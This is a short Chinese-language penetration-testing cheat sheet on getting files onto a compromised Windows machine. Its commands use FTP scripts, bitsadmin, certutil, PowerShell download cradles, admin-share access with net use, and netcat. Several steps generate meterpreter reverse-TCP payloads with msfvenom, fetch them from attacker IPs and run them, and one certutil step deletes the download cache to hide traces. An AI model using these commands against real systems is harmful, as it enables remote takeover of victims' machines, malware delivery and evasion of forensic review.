Windows

FTP

vps：python快速开启ftp服务器

1pip3 install pyftpdlib
2python3 -m pyftpdlib

win目标机写文件：

1copy con 1.txt
2open 192.168.78.70 2121
3anonymous
4anonymous
5get evil.bat
6quit
7ctrl+z

再执行文本中的命令（因为没有交互式才这样）：

1ftp -i -s:1.txt

Bitsadmin

是命令行工具，可以使用它创建下载或上载文件，并监视进度

vps msfvenom生成木马文件：

1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.155.49.43 lport=7777 -f hta-psh > 44.hta

目标机先下载，后加载脚本执行：

1bitsadmin /transfer shell http://192.155.49.42/44.hta C:\windows\temp\44.hta
2
3rundll32.exe url.dll,OpenURL 44.hta

关于rundll32：https://xz.aliyun.com/2188

Certutil

生成，下载并执行。下载后再%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content有缓存。

1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=6666 -f exe > 44.exe
2
3certutil.exe -urlcache -split -f http://139.155.49.43/44.exe & start c:\windows\temp\44.exe
4
5#删除缓存
6certutil.exe -urlcache -split -f http://139.155.49.43/44.exe /delete

Powershell

$env是%USERPROFILE%\AppData\Local。

1$p = new-object system.net.webclient
2$p.downloadfile("http://xx.xx.xx.xx/file","c:\xx\xx\file")
3
4powershell -c "$p=new-object system.net.webclient;$p.downloadfile("http://xx.xx.xx.xx/file","c:\xx\xx\file")"
5
6powershell (new-object system.net.webclient).downloadfile("http://xx.xx.xx.xx/file","c:\xx\xx\file")
7
8powershell Invoke-WebRequest -uri "http://192.168.1.227/s.txt" -OutFile "$env:temp\s.php"

Windows文件共享

net use文件共享。123123是目标机admin的密码。

1net use k:\\xxx.xxx.xxx.xxx\c$ "123123" /user:administrator
2#查看C盘
3dir \\xxx.xxx.xxx.xxx\c$
4#下载文件
5copy \\xxx.xxx.xxx.xxx\d$\KeyGen.exe k.exe
6#上传
7copy k.exe \\xxx.xxx.xxx.xxx\d$\KeyGen.exe

Netcat

1#传输file文件到1234端口
2vps:cat file | nc -l 1234
3#保存到file
4目标:nc host_ip 1234 > file
5
6#发送file文件至目标机，这时需要目标机能访问到。
7nc host_ip 1234 < file 
8#目标机将接收的数据存储到file文件
9nc -lvvp 1234 > file
